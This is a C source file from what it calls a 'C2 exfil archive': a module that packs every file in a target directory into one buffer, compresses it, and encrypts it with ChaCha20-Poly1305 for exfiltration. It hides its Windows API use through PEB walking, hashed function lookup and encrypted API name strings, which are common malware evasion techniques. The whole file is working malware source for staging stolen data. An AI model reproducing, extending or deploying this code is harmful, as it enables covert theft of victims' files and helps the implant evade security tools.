/*
 * packer.c — directory packer (TLV) for the C2 exfil archive.
 *
 * Format: [file_count u32 LE]{ [name_len u16 LE][name][flen u32 LE][data] }*
 *
 * pack_buffer_from_dir packs every regular file in dir into one malloc'd
 * TLV buffer. size_cb supplies the expected file size for the allocation
 * pass (TEST_PACKER_SEAM injects a deterministic one for the TOCTOU tests);
 * the read pass never trusts it: if a file grew between the two passes the
 * buffer is grown with realloc, and if the read fails or the file exceeds
 * the 10 MB cap the entry is stored as a zero-length TLV. Never overflows.
 *
 * pack_and_encrypt_dir: LZ4-compresses (optional) then encrypts the TLV
 * buffer with archive_crypt (ChaCha20-Poly1305).
 */
#include "packer.h"
#include "config.h"
#include "file_utils.h"
#include "enc_strings.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "lz4.h"
#include "archive_crypt.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>

#ifdef _WIN32
#include <windows.h>
#endif

/* Per-file cap: larger entries are stored as zero-length, not packed. */
#define PACKER_MAX_FILE_LEN (10u * 1024u * 1024u)

#ifndef TEST_PACKER_SEAM

/* ── PEB-walk singleton for Find* APIs ─────────────────────────── */
typedef HANDLE (WINAPI *pFindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindClose)(HANDLE);

static struct {
    pFindFirstFileA pFF;
    pFindNextFileA  pFN;
    pFindClose      pFC;
    int ready;
} g_packer_find;

static int packer_find_ensure_api(void) {
    if (g_packer_find.ready) return 1;
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn[32];
    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
    g_packer_find.pFF = (pFindFirstFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
    g_packer_find.pFN = (pFindNextFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
    g_packer_find.pFC = (pFindClose)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!g_packer_find.pFF || !g_packer_find.pFN || !g_packer_find.pFC) return 0;
    g_packer_find.ready = 1;
    return 1;
}
#endif /* !TEST_PACKER_SEAM */

/* ── Directory listing via Find* APIs ───────────────────────────
 * TEST_PACKER_SEAM routes enumeration through function pointers the
 * test installs, so deterministic TOCTOU conditions can be driven on
 * host gcc without any Windows API. */
#ifdef TEST_PACKER_SEAM

typedef HANDLE (*packer_open_dir_fn)(const char *dir, WIN32_FIND_DATAA *ffd);
typedef int    (*packer_next_fn)(HANDLE hf, WIN32_FIND_DATAA *ffd);
typedef void   (*packer_close_fn)(HANDLE hf);
typedef int    (*packer_entry_fn)(WIN32_FIND_DATAA *ffd, const char **name,
                                  size_t *name_len, size_t *size_hint, int *is_dir);

extern packer_open_dir_fn g_packer_open_dir;
extern packer_next_fn    g_packer_next;
extern packer_close_fn   g_packer_close;
extern packer_entry_fn   g_packer_entry;

#define packer_open_dir(dir, ffd) g_packer_open_dir((dir), (ffd))
#define packer_next(hf, ffd)      g_packer_next((hf), (ffd))
#define packer_close(hf)          g_packer_close((hf))
#define packer_entry(ffd, n, nl, sh, d) g_packer_entry((ffd), (n), (nl), (sh), (d))
#define PACKER_ENSURE_API() 1

#else /* TEST_PACKER_SEAM: production */

static HANDLE packer_open_dir(const char *dir, WIN32_FIND_DATAA *ffd) {
    char find_path[MAX_PATH];
    snprintf(find_path, sizeof(find_path), "%s\\*", dir);
    return g_packer_find.pFF(find_path, ffd);
}
static int packer_next(HANDLE hf, WIN32_FIND_DATAA *ffd) {
    return g_packer_find.pFN(hf, ffd) != 0;
}
static void packer_close(HANDLE hf) {
    g_packer_find.pFC(hf);
}
static int packer_entry(WIN32_FIND_DATAA *ffd, const char **name, size_t *name_len,
                        size_t *size_hint, int *is_dir) {
    if (ffd->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { *is_dir = 1; return 0; }
    *name = ffd->cFileName;
    *name_len = strlen(ffd->cFileName);
    *size_hint = (size_t)ffd->nFileSizeLow + ((size_t)ffd->nFileSizeHigh << 32);
    *is_dir = 0;
    return 0;
}
#define PACKER_ENSURE_API() packer_find_ensure_api()

#endif

/* ── pack_buffer_from_dir ─────────────────────────────────────── */
unsigned char *pack_buffer_from_dir(const char *dir, size_t *out_len,
                                                   size_t (*size_cb)(const char *path,
                                                                     const char *name)) {
    *out_len = 0;
    if (!PACKER_ENSURE_API()) return NULL;
    WIN32_FIND_DATAA ffd;
    HANDLE hf = packer_open_dir(dir, &ffd);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    /* First pass: compute total size */
    size_t total = 0;
    int file_count = 0;
    do {
        const char *name = NULL; size_t name_len = 0, size_hint = 0; int is_dir = 0;
        if (packer_entry(&ffd, &name, &name_len, &size_hint, &is_dir) != 0 || is_dir) continue;
        char file_path[MAX_PATH];
        snprintf(file_path, sizeof(file_path), "%s\\%s", dir, name);
        size_t flen = size_cb ? size_cb(file_path, name) : size_hint;
        if (flen > PACKER_MAX_FILE_LEN) flen = PACKER_MAX_FILE_LEN;
        total += 4 + name_len + 4 + flen;
        file_count++;
    } while (packer_next(hf, &ffd));
    packer_close(hf);

    if (file_count == 0) return NULL;

    /* Allocate +4 for file_count header */
    size_t cap = total + 4;
    unsigned char *buf = (unsigned char *)malloc(cap);
    if (!buf) return NULL;

    /* Second pass: write data */
    size_t off = 0;
    buf[off++] = (unsigned char)(file_count);
    buf[off++] = (unsigned char)(file_count >> 8);
    buf[off++] = (unsigned char)(file_count >> 16);
    buf[off++] = (unsigned char)(file_count >> 24);

    hf = packer_open_dir(dir, &ffd);
    if (hf == INVALID_HANDLE_VALUE) { free(buf); return NULL; }

    do {
        const char *name = NULL; size_t name_len = 0, size_hint = 0; int is_dir = 0;
        if (packer_entry(&ffd, &name, &name_len, &size_hint, &is_dir) != 0 || is_dir) continue;

        /* Write filename length + filename */
        buf[off++] = (unsigned char)(name_len);
        buf[off++] = (unsigned char)(name_len >> 8);
        memcpy(buf + off, name, name_len);
        off += name_len;

        /* Write file contents — TOCTOU: a file may have grown since the
         * sizing pass; grow the buffer, never write past cap. */
        char file_path[MAX_PATH];
        snprintf(file_path, sizeof(file_path), "%s\\%s", dir, name);
        size_t flen = 0;
        unsigned char *fdata = read_file(file_path, &flen);
        if (!fdata || flen > PACKER_MAX_FILE_LEN) {
            /* read failure or over-cap file: zero-length entry, never overflow */
            free(fdata);
            buf[off++] = 0; buf[off++] = 0; buf[off++] = 0; buf[off++] = 0;
        } else {
            if (off + 4 + flen > cap) {
                size_t newcap = cap + 4 + flen + 4096;
                unsigned char *tmp = (unsigned char *)realloc(buf, newcap);
                if (!tmp) {
                    /* realloc failure: zero-length entry, never overflow */
                    free(fdata);
                    buf[off++] = 0; buf[off++] = 0; buf[off++] = 0; buf[off++] = 0;
                    continue;
                }
                buf = tmp;
                cap = newcap;
            }
            buf[off++] = (unsigned char)(flen);
            buf[off++] = (unsigned char)(flen >> 8);
            buf[off++] = (unsigned char)(flen >> 16);
            buf[off++] = (unsigned char)(flen >> 24);
            memcpy(buf + off, fdata, flen);
            off += flen;
            free(fdata);
        }
    } while (packer_next(hf, &ffd));
    packer_close(hf);

    *out_len = off;
    return buf;
}

#ifndef TEST_PACKER_SEAM
/* Pack all files in output_dir into an encrypted archive buffer.
 * Returns malloc'd buffer and sets out_len, or NULL on failure. */
unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
    unsigned char *buf = pack_buffer_from_dir(dir, out_len, NULL);
    if (!buf) return NULL;
    size_t off = *out_len;

#ifdef ENABLE_COMPRESSION
    /* LZ4-compress the packed TLV buffer before encryption */
    {
        size_t packed_len = off;  /* snapshot: off won't change during compress */
        int comp_bound = lz4_compress_bound((int)packed_len);
        unsigned char *comp = (unsigned char *)malloc((size_t)comp_bound + 5);
        if (comp) {
            int comp_len = lz4_compress((const char *)buf, (char *)(comp + 5),
                                         (int)packed_len, comp_bound);
            if (comp_len > 0 && (size_t)comp_len < packed_len) {
                comp[0] = 0x01; /* magic: LZ4 compressed */
                /* Store original uncompressed size as LE uint32 */
                comp[1] = (unsigned char)(packed_len);
                comp[2] = (unsigned char)(packed_len >> 8);
                comp[3] = (unsigned char)(packed_len >> 16);
                comp[4] = (unsigned char)(packed_len >> 24);
                free(buf);
                buf = comp;
                off = (size_t)comp_len + 5;
            } else {
                free(comp);
                /* keep original uncompressed buf */
            }
        }
        /* If malloc fails, skip compression and send uncompressed */
    }
#endif

    /* Encrypt with ChaCha20-Poly1305 via archive_crypt */
    size_t enc_cap = off + 64; /* header + padding */
    unsigned char *enc = (unsigned char *)malloc(enc_cap);
    if (!enc) { free(buf); return NULL; }

    size_t enc_len = enc_cap;
    if (archive_encrypt(buf, off, NULL, 0, enc, &enc_len) < 0) {
        free(buf); free(enc);
        return NULL;
    }

    free(buf);
    *out_len = enc_len;
    return enc;
}
#endif /* TEST_PACKER_SEAM */
